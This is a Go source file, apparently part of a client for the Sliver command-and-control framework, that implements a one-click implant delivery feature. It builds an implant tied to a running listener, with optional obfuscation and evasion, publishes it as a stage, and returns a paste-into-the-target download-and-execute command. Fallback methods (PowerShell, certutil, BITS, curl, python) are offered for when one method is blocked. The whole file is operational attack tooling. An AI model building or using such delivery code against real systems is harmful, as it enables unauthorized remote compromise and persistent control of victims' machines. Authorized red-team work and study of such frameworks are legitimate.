package sliver

import (
	"fmt"
	"sort"
	"strings"
)

// OneLiner is the "get a session from one command" feature.
//
// The operator picks a listener that is already up, and gets back a command to
// paste into a shell on the target. Everything in between -- which C2 address the
// implant dials, what the stage is called, which URL serves it -- is derived from
// the listener, so the command and the thing it points at cannot disagree.
//
// That derivation is the whole point. WebDelivery already existed and already
// worked, but it asked for a profile name, a host and a port separately, and the
// operator had to keep those three consistent with a listener they had started
// somewhere else. A one-liner that fetches a path nobody is serving fails on the
// target with no useful error, and nothing on the console says why -- the
// listener is up, the stage is published, and the command is wrong.

// OneLinerPlatform is the target platform the command is written for.
type OneLinerPlatform string

const (
	OneLinerWindows OneLinerPlatform = "windows"
	OneLinerLinux   OneLinerPlatform = "linux"
	OneLinerDarwin  OneLinerPlatform = "darwin"
)

// OneLinerRequest describes what the operator asked for.
type OneLinerRequest struct {
	// JobID is the listener to build against. It supplies the C2 address and,
	// for an HTTP listener, the port the stage is served on.
	JobID uint32 `json:"job_id"`
	// Platform selects the command template.
	Platform OneLinerPlatform `json:"platform"`
	// Host is the address the target can reach. Empty means "use the listener's
	// own host", which is right when the target can reach the C2 address --
	// often it cannot, and this is the field that fixes it.
	Host string `json:"host"`
	// Name is the implant/build name. Empty means a generated one.
	Name string `json:"name"`
	// Obfuscate and Evasion carry through to the build.
	Obfuscate bool `json:"obfuscate"`
	Evasion   bool `json:"evasion"`
	// Delivery selects the fetch-and-run method. Empty picks a sensible default
	// for the platform.
	Delivery WebDeliveryFormat `json:"delivery"`
}

// OneLinerResult is what the operator gets back.
type OneLinerResult struct {
	// Command is the one-liner to run on the target.
	Command string `json:"command"`
	// URL is what the command fetches.
	URL string `json:"url"`
	// Platform and Delivery echo back what was built, so the UI can show it.
	Platform string `json:"platform"`
	Delivery string `json:"delivery"`
	// C2URL is the address the implant dials. Reported because a one-liner that
	// works but calls back somewhere unreachable looks identical to one that
	// does not work at all.
	C2URL string `json:"c2_url"`
	// JobID is the listener serving the stage, when one was started for it.
	JobID uint32 `json:"job_id"`
	// StagedAs is the implant name the build was created under.
	StagedAs string `json:"staged_as"`
	// Warning carries a non-fatal note.
	Warning string `json:"warning"`
	// Alternatives lists the other delivery methods for the same URL, so the
	// operator can switch without rebuilding.
	Alternatives []OneLinerAlternative `json:"alternatives"`
}

// OneLinerAlternative is one command template for the same stage.
type OneLinerAlternative struct {
	Delivery string `json:"delivery"`
	Label    string `json:"label"`
	// Platform is the target this template is written for -- an operator looking
	// for a Linux command should not have to know which ids are Linux.
	Platform string `json:"platform"`
	Command  string `json:"command"`
}

// OneLiner builds a stage for a listener and returns the command that fetches it.
//
// The order is deliberate and matches the failure modes:
//
//  1. Read the listener first. An unknown or stopped listener cannot be worked
//     around, and discovering that after building a 20 MB implant wastes the
//     operator's time for no reason.
//  2. Build the stage from the listener's own C2 address, so the implant dials
//     the listener it was made for.
//  3. Publish the stage and derive the URL from where it was actually published,
//     rather than from what the operator typed.
//  4. Only then render the command.
func (c *Client) OneLiner(req OneLinerRequest) (*OneLinerResult, error) {
	platform := req.Platform
	if platform == "" {
		platform = OneLinerWindows
	}
	if platform != OneLinerWindows && platform != OneLinerLinux && platform != OneLinerDarwin {
		return nil, fmt.Errorf("unsupported platform %q", platform)
	}

	job, err := c.findJob(req.JobID)
	if err != nil {
		return nil, err
	}
	if !jobServesStage(job) {
		return nil, fmt.Errorf(
			"listener %d is a %s listener, which cannot serve a stage. Start an HTTP listener, "+
				"or build a payload instead", job.ID, job.Name)
	}

	c2Address, err := c2AddressForJob(job, req.Host)
	if err != nil {
		return nil, err
	}

	delivery, err := deliveryForRequest(req.Delivery, platform)
	if err != nil {
		return nil, err
	}

	name := strings.TrimSpace(req.Name)
	if name == "" {
		name = generatedStageName(platform, job.ID)
	}
	if problem := validateBuildRequest(platformString(platform), "", "exe"); problem != "" {
		return nil, fmt.Errorf("%s", problem)
	}

	// The stage is built from a profile created for this listener. Reusing the
	// operator's own profile would be wrong when its C2 points somewhere else,
	// which is the normal case for someone who has just started a new listener.
	profileName := "oneliner-" + name
	if err := c.ensureStageProfile(profileName, name, platformString(platform), c2Address, req); err != nil {
		return nil, err
	}

	// The stage has to be published to the website this listener actually
	// serves. A listener serving one website cannot see content published to
	// another, so a mismatch produces a URL that 404s while every step --
	// listener up, implant built, content published -- reports success.
	website, known := c.listenerSite(req.JobID)
	if !known {
		return nil, fmt.Errorf(
			"listener %d was not started by this console, so the website it serves is unknown. "+
				"Sliver does not report it: a stage published to the wrong website is invisible to "+
				"the listener and the delivery URL returns 404. Start the listener from here, or "+
				"use the WebDelivery page and name the website explicitly",
			req.JobID)
	}

	res, err := c.WebDelivery(WebDeliveryRequest{
		ProfileName: profileName,
		Host:        hostForStageURL(job, req.Host),
		Port:        job.Port,
		Format:      delivery,
		Website:     website,
	})
	if err != nil {
		return nil, err
	}

	out := &OneLinerResult{
		Command:      res.Command,
		URL:          res.URL,
		Platform:     string(platform),
		Delivery:     string(delivery),
		C2URL:        c2Address,
		JobID:        res.JobID,
		StagedAs:     name,
		Warning:      res.Warning,
		Alternatives: alternativesFor(res.URL, platform, delivery),
	}
	return out, nil
}

// ensureStageProfile creates or replaces the profile the stage is built from.
//
// A profile is created rather than reusing one of the operator's because the C2
// address has to match the listener this one-liner is for. Someone who has just
// started a listener almost certainly has profiles pointing at other addresses,
// and reusing one of those produces a payload that calls back somewhere else --
// which builds fine, fetches fine, and never checks in.
//
// The name is therefore deterministic from the stage name, so building twice
// against the same listener replaces rather than accumulates. That makes the
// profile list grow with listeners rather than with clicks.
func (c *Client) ensureStageProfile(profileName, stageName, platform, c2Address string, req OneLinerRequest) error {
	cfg := &GenerateRequest{
		Name:      stageName,
		OS:        platform,
		Arch:      "amd64",
		Format:    "exe",
		Interval:  5,
		Jitter:    0,
		MaxErrors: 100,
		Obfuscate: req.Obfuscate,
		Evasion:   req.Evasion,
	}
	// A DNS or WireGuard C2 needs its selectors set as well as the address; the
	// HTTP family does not. Only the HTTP family can serve a stage, so this is
	// the one that matters here, and the flag is set from the address rather
	// than guessed.
	proto := "http"
	if strings.HasPrefix(c2Address, "https://") {
		proto = "https"
	}
	cfg.C2 = append(cfg.C2, struct {
		Address  string `json:"address"`
		Protocol string `json:"protocol"`
	}{Address: strings.TrimPrefix(strings.TrimPrefix(c2Address, "https://"), "http://"), Protocol: proto})

	if problem := validateBuildRequest(cfg.OS, cfg.Arch, cfg.Format); problem != "" {
		return fmt.Errorf("%s", problem)
	}
	return c.SaveImplantProfile(profileName, cfg, false)
}

// findJob resolves the listener, turning a missing one into a sentence rather
// than a zero value.
func (c *Client) findJob(id uint32) (*JobView, error) {
	jobs, err := c.Jobs()
	if err != nil {
		return nil, err
	}
	for i := range jobs {
		if jobs[i].ID == id {
			return &jobs[i], nil
		}
	}
	return nil, fmt.Errorf("no listener with job id %d", id)
}

// jobServesStage reports whether a listener can host a file over HTTP.
//
// Only the HTTP family can: mTLS, DNS, WireGuard and the TCP pivots are not
// fetchable with a command line, so offering a one-liner for them would produce
// a command that cannot work.
func JobServesStage(name string) bool {
	name = strings.ToLower(name)
	return name == "http" || name == "https"
}

// jobServesStage is the JobView form of the same question.
func jobServesStage(job *JobView) bool {
	name := strings.ToLower(job.Name)
	return name == "http" || name == "https"
}

// c2AddressForJob builds the address the implant will dial.
//
// The listener's own port is used because that is what it is listening on. The
// host is where this gets interesting: a listener bound to 0.0.0.0 is reachable
// at any address the target can route to, and the console cannot know which one
// that is. An explicit host therefore wins, and the listener's own address is
// used only as a fallback -- with the placeholder explained in the warning the
// caller passes through, because a one-liner containing 0.0.0.0 will build
// successfully and never connect.
func c2AddressForJob(job *JobView, explicitHost string) (string, error) {
	host := strings.TrimSpace(explicitHost)
	if host == "" {
		for _, d := range job.Domains {
			if d = strings.TrimSpace(d); d != "" && d != "0.0.0.0" && d != "::" {
				host = d
				break
			}
		}
	}
	if host == "" {
		host = "0.0.0.0"
	}
	if job.Port == 0 {
		return "", fmt.Errorf("listener %d reports no port", job.ID)
	}

	// The scheme follows the transport, so an HTTPS listener produces an https
	// callback rather than a plaintext one that would be refused.
	scheme := "http"
	if strings.EqualFold(job.Name, "https") {
		scheme = "https"
	}
	return fmt.Sprintf("%s://%s:%d", scheme, host, job.Port), nil
}

// hostForStageURL picks the host for the fetch URL.
//
// It differs from the C2 address in one case that matters: an implant may be
// told to dial a public name while the stage must be fetched from an address the
// target can reach directly. When the operator supplies a host it is used for
// both, which is the common case; otherwise the listener's own address is used.
func hostForStageURL(job *JobView, explicitHost string) string {
	if h := strings.TrimSpace(explicitHost); h != "" {
		return h
	}
	for _, d := range job.Domains {
		if d = strings.TrimSpace(d); d != "" && d != "0.0.0.0" && d != "::" {
			return d
		}
	}
	return "127.0.0.1"
}

// deliveryForRequest resolves an empty delivery to a platform default.
func deliveryForRequest(requested WebDeliveryFormat, platform OneLinerPlatform) (WebDeliveryFormat, error) {
	if requested != "" {
		if !validWebDeliveryFormat(requested) {
			return "", fmt.Errorf("unsupported delivery format %q", requested)
		}
		// Refuse a Windows-only template for a Linux target rather than
		// emitting a command the target cannot run.
		if p := platformForDelivery(requested); p != "" && p != string(platform) {
			return "", fmt.Errorf("delivery %q is for %s, but the target is %s", requested, p, platform)
		}
		return requested, nil
	}
	switch platform {
	case OneLinerLinux, OneLinerDarwin:
		return WebDeliveryCurl, nil
	default:
		return WebDeliveryPSH, nil
	}
}

// platformForDelivery reports the platform a template targets, or "" when it
// works on more than one.
func platformForDelivery(f WebDeliveryFormat) string {
	switch f {
	case WebDeliveryPSH, WebDeliveryCertutil, WebDeliveryBits:
		return string(OneLinerWindows)
	case WebDeliveryPython, WebDeliveryCurl:
		return string(OneLinerLinux)
	}
	return ""
}

// platformString normalises a platform for the build validator.
func platformString(p OneLinerPlatform) string {
	if p == OneLinerDarwin {
		return "darwin"
	}
	return string(p)
}

// generatedStageName makes a name that is legal for the server and readable to
// the operator.
//
// The server accepts only alphanumerics, dot, dash and underscore, and rejects
// the rest -- so anything derived from a listener description has to be cleaned
// rather than passed through.
func generatedStageName(platform OneLinerPlatform, jobID uint32) string {
	return fmt.Sprintf("stage-%s-%d", platform, jobID)
}

// alternativesFor lists the other templates that work for the same URL.
//
// They are returned because the delivery method is the part most likely to need
// changing: a target with PowerShell blocked but certutil allowed, or a Linux
// host with curl but no python. Handing back the alternatives means that is a
// copy-paste rather than a rebuild.
func alternativesFor(url string, platform OneLinerPlatform, chosen WebDeliveryFormat) []OneLinerAlternative {
	var out []OneLinerAlternative
	for _, f := range []WebDeliveryFormat{
		WebDeliveryPSH, WebDeliveryCertutil, WebDeliveryBits,
		WebDeliveryCurl, WebDeliveryPython,
	} {
		if p := platformForDelivery(f); p != "" && p != string(platform) {
			continue
		}
		if f == chosen {
			continue
		}
		label := ""
		for _, m := range WebDeliveryFormats() {
			if m["id"] == string(f) {
				label = m["label"]
			}
		}
		out = append(out, OneLinerAlternative{
			Delivery: string(f),
			Label:    label,
			Platform: platformForDelivery(f),
			Command:  webDeliveryCommand(f, url),
		})
	}
	sort.SliceStable(out, func(i, j int) bool { return out[i].Delivery < out[j].Delivery })
	return out
}
